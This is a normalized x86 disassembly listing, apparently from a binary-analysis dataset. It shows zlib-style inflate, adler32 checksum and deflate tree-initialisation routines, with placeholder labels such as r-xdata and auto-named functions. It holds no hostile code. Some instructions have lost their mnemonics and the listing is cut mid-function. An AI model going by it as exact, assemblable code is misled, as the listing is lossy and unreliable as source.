mov ecx [ esp + 0x10 ]
push 0xfffffffe
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x48 ]
sub edx esi
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
jmp [ eax * 4 + jump_table_4073f0 ]
mov [ esp + 0x1c ] eax
mov esi [ esp + 0x18 ]
cmp ebp 0x3
jae r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp ebp 0x20
jae r-xdata
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov edi [ esp + 0x18 ]
cmp ebp 0xe
jae r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
push 0xfffffffd
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov edx esi
mov ecx esi
not edx
and ecx 0xffff
shr edx 0x10
xor edx ecx
jne r-xdata
xor edx edx
cmp edi edx
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ eax + 0x4 ] 0x0
push edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov eax edi
and eax 0x3fff
mov ecx eax
mov [ ebx + 0x4 ] eax
and ecx 0x1f
cmp ecx 0x1d
ja r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x8 ]
mov eax 0x13
cmp ecx eax
jae r-xdata
cmp ebp 0x3
jae r-xdata
mov ecx [ ebx + 0x24 ]
mov eax [ ebx + 0x4 ]
push esi
push ecx
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x44 ]
push edx
push ecx
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x30 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
mov ecx eax
shr ecx 0x5
and ecx 0x1f
and eax 0x1f
inc ecx
push edx
add eax 0x101
push ecx
push eax
mov [ ebx + 0x14 ] 0x0
mov [ esp + 0x44 ] 0x9
mov [ esp + 0x40 ] 0x6
call sub_409ee0
add esp 0x24
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp ebp eax
jae r-xdata
push eax
push esi
push ebx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0x4 ]
push esi
push ecx
mov [ esp + 0x54 ] 0x0
call sub_409950
mov eax [ ebx + 0x20 ]
mov ecx [ ebx + 0x34 ]
mov edi [ esi ]
mov edx [ esi + 0x4 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x30 ]
add esp 0x8
cmp ecx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov [ ebx ] 0x8
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ ebx + 0x1c ] ebp
mov [ ebx + 0x20 ] edx
mov edx [ esp + 0x14 ]
mov ebp [ esi ]
mov [ esi + 0x4 ] edx
mov edx edi
mov [ esi ] edi
sub edx ebp
mov ebp [ esi + 0x8 ]
add ebp edx
mov [ esi + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_407418 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ecx edi
mov edx [ eax ]
mov ebp [ eax + 0x8 ]
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
mov ecx [ esp + 0x4c ]
push ecx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec eax
mov cl [ edi ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] eax
or esi edx
inc edi
cmp ebp 0x3
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] edi
jb r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx ] 0x9
mov edx eax
push 0xfffffffd
mov [ ecx + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
sub edx esi
add ebp edx
mov [ ecx ] eax
mov eax [ esp + 0x48 ]
push ecx
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ebp ebp
mov eax ecx
cmp eax ebp
mov [ ebx + 0x4 ] ecx
mov [ esp + 0x18 ] ebp
je r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx eax
sub edx esi
mov [ ecx ] eax
mov eax [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ ecx + 0x8 ] ebp
push edx
push ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
mov [ esp + 0x4c ] edx
mov cl [ eax ]
dec edi
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] edi
or esi edx
inc eax
cmp ebp 0x20
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4c ] 0x0
cmp eax edi
jbe r-xdata
mov ecx [ ebx + 0x2c ]
mov edx [ esp + 0x44 ]
cmp edx ecx
jne r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
push 0xfffffffd
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
sub edx esi
add ebp edx
push ebx
mov [ eax + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx eax
and edx 0x3e0
cmp edx 0x3a0
ja r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
sub edx esi
add ebp edx
mov edx [ esp + 0x4c ]
push edx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec esi
mov cl [ eax ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] esi
or edi edx
inc eax
cmp ebp 0xe
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ ebx + 0x24 ]
push esi
lea ecx [ ebx + 0x14 ]
lea eax [ ebx + 0x10 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
push eax
push edx
mov [ eax ] 0x7
call sub_409970
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
mov [ ecx + edx * 4 ] 0x0
mov edx [ ebx + 0x8 ]
inc edx
mov ecx edx
mov [ ebx + 0x8 ] edx
cmp ecx eax
jb r-xdata
mov ecx [ ebx + 0x8 ]
mov eax edi
and eax 0x7
sub ebp 0x3
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
shr edi 0x3
mov [ ecx + edx * 4 ] eax
mov edx [ ebx + 0x8 ]
inc edx
mov [ ebx + 0x8 ] edx
mov eax edx
mov edx [ ebx + 0x4 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jb r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x1c ]
push esi
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_409160
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebx + 0x14 ]
and eax edi
xor edx edx
mov dl [ ecx + eax * 8 + 0x1 ]
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x18 ] edx
mov eax [ eax + 0x4 ]
cmp eax 0x10
mov [ esp + 0x34 ] eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] ebp
mov ebp [ esi ]
mov eax edi
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub eax ebp
push 0x1
add edx eax
push esi
mov [ esi + 0x8 ] edx
mov [ esi ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
sub ebp 0x3
mov [ ebx ] 0x1
mov ecx ebp
and ecx 0x7
shr esi 0x3
shr esi cl
sub ebp ecx
mov [ esp + 0x18 ] esi
jmp r-xdata
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x34 ]
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_40a070
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x4c ]
push eax
push ecx
push edx
call sub_409160
add esp 0x28
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
add ebp 0xfffffffd
shr esi 0x3
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
mov edx edi
push 0xfffffffd
sub edx ecx
mov ecx [ esp + 0x48 ]
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x18 ]
neg eax
sbb eax eax
and eax 0x7
mov [ ebx ] eax
jmp r-xdata
mov eax 0x2
mov [ ebx ] eax
jmp r-xdata
cmp eax ecx
jbe r-xdata
mov eax edi
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push eax
push edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a0a0
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0x30 ]
add esp 0xc
cmp edx esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ ebx + 0x28 ]
cmp eax esi
je r-xdata
mov esi [ esp + 0x48 ]
push 0x4
shr eax 0x5
and eax 0x1f
lea eax [ eax + ecx + 0x102 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x20 ]
add esp 0xc
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x5
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx [ esi + 0x8 ]
mov edx eax
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx ecx
xor ecx ecx
mov cl [ eax ]
dec edx
mov [ esp + 0x14 ] edx
mov edx ecx
mov ecx ebp
add ebp 0x8
shl edx cl
mov [ esp + 0x4c ] 0x0
or edi edx
inc eax
cmp ebp 0x3
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov ecx eax
mov [ esi ] eax
mov eax [ esp + 0x18 ]
sub ecx edi
add edx ecx
push eax
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x48 ]
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
push 0xfffffffc
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x6
jmp r-xdata
cmp eax 0x12
mov ecx 0x7
je r-xdata
mov ecx edx
sub ebp edx
mov edx [ ebx + 0xc ]
shr edi cl
mov ecx [ ebx + 0x8 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebx + 0x8 ]
inc eax
jmp r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
cmp ebp eax
mov [ esp + 0x10 ] ecx
jb r-xdata
mov [ ebx ] 0x7
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ eax ]
mov ecx edi
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
push 0xfffffffc
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x6
jmp r-xdata
mov eax esi
and eax 0x7
mov ecx eax
shr eax 0x1
and ecx 0x1
cmp eax 0x3
mov [ ebx + 0x18 ] ecx
ja r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x44 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
sub edx eax
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x44 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x4 ]
sub edi eax
add esi eax
sub ecx eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x1c ] edx
mov [ ebx + 0x4 ] ecx
jne r-xdata
mov eax ecx
mov ecx [ ebx + 0x2c ]
sub ecx edx
mov ecx esi
sub ecx edx
dec ecx
jmp r-xdata
mov edx esi
cmp edx eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
push 0xfffffffc
mov ecx eax
push esi
sub ecx edi
mov [ esi ] eax
add edx ecx
push ebx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x50 ]
mov [ ebx + 0x34 ] edx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr edi 0xe
sub ebp 0xe
mov [ ebx + 0x8 ] 0x0
mov [ ebx ] 0x4
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
push ecx
push esi
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
and eax 0x1f
shr edx 0x5
and edx 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx eax
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub ecx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add edx ecx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x44 ]
push eax
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_4091a0
add esp 0xc
cmp eax 0x1
jne r-xdata
sub eax 0x12
mov [ esp + 0x1c ] ecx
neg eax
sbb eax eax
add ecx edx
and al 0xf8
mov [ esp + 0x20 ] ecx
add eax 0xb
cmp ebp ecx
jae r-xdata
lea ecx [ eax - 0xe ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
shr edx 0x5
and edx 0x1f
and eax 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jb r-xdata
mov [ ebx + 0x34 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
push ebx
call sub_40a0a0
mov ecx [ ebx + 0x34 ]
mov edx [ ebx + 0x30 ]
add esp 0xc
cmp edx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ esp + 0x1c ] ecx
cmp edx eax
mov [ esp + 0x20 ] eax
jne r-xdata
sub ecx edx
sub eax edx
dec eax
mov ecx eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jae r-xdata
mov ecx edx
shr edi cl
mov ecx [ esp + 0x1c ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edi
add eax ecx
mov ecx [ esp + 0x1c ]
shr edi cl
add ecx edx
mov [ esp + 0x18 ] eax
sub ebp ecx
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebx + 0x4 ]
mov edx ecx
and ecx 0x1f
shr edx 0x5
and edx 0x1f
lea ecx [ edx + ecx + 0x102 ]
mov edx [ esp + 0x1c ]
add eax edx
cmp eax ecx
ja r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov ebp [ edi ]
mov esi [ edi + 0x8 ]
mov [ edi + 0x4 ] ecx
mov ecx eax
mov [ edi ] eax
sub ecx ebp
add esi ecx
mov [ edi + 0x8 ] esi
mov [ ebx + 0x34 ] edx
mov edx [ esp + 0x4c ]
push edx
push edi
push ebx
call sub_40a0a0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x14 ]
mov edx eax
cmp edx esi
mov [ esp + 0x44 ] edx
jae r-xdata
test ecx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add ecx edx
push 0xfffffffd
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a0a0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
cmp [ esp + 0x34 ] 0x10
jne r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
cmp ebp ecx
jb r-xdata
mov ecx [ esp + 0x20 ]
sub ecx edx
sub esi edx
dec esi
mov ecx esi
jmp r-xdata
mov eax [ esp + 0x1c ]
xor ecx ecx
mov eax edx
cmp eax 0x1
jb r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
mov edx [ ebx + 0xc ]
inc eax
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx [ esp + 0x18 ]
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov ecx [ ebx + 0xc ]
mov ecx [ ecx + eax * 4 - 0x4 ]
jmp r-xdata
sub_407430
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push 0x0
push esi
push edi
call sub_406600
mov eax [ edi + 0x28 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
mov edx [ edi + 0x24 ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
push edi
push ecx
call [ esi + 0x24 ]
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_407470
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx edi
and ecx 0xffff
shr edi 0x10
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0x18 ]
test ebx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax edi
pop ebx
shl eax 0x10
pop edi
or eax ecx
pop esi
retn
push ebp
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
mov ebp eax
shr ebp 0x4
mov edx ebp
neg edx
shl edx 0x4
add eax edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
test ebx ebx
mov edi edx
ja r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
xor edx edx
mov dl [ esi ]
add esi 0x10
add ecx edx
xor edx edx
mov dl [ esi - 0xf ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x1 ]
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
cmp ebx 0x15b0
mov eax ebx
jb r-xdata
pop ebp
sub_4075d0
call sub_407640
mov eax [ esp + 0x4 ]
push eax
lea ecx [ eax + 0x8c ]
lea edx [ eax + 0x980 ]
mov [ eax + 0xb10 ] ecx
lea ecx [ eax + 0xa74 ]
mov [ eax + 0xb28 ] ecx
xor ecx ecx
mov [ eax + 0xb18 ] rw-data
mov [ eax + 0xb1c ] edx
mov [ eax + 0xb24 ] rw-data
mov [ eax + 0xb30 ] rw-data
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
mov [ eax + 0x16ac ] 0x8
call sub_407650
pop ecx
retn
sub_407650
mov edx [ esp + 0x4 ]
push esi
mov ecx 0x11e
xor esi esi
lea eax [ edx + 0x8c ]
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0x980 ]
mov ecx 0x1e
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0xa74 ]
mov ecx 0x13
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
mov [ edx + 0x16a4 ] esi
mov [ edx + 0x16a0 ] esi
mov [ edx + 0x16a8 ] esi
mov [ edx + 0x1698 ] esi
mov [ edx + 0x48c ] 0x1
pop esi
retn
sub_4076c0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
mov edx [ esp + 0x10 ]
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
mov [ eax + 0x16b4 ] ecx
mov edx [ esp + 0x10 ]
push ebx
push esi
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
push edi
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
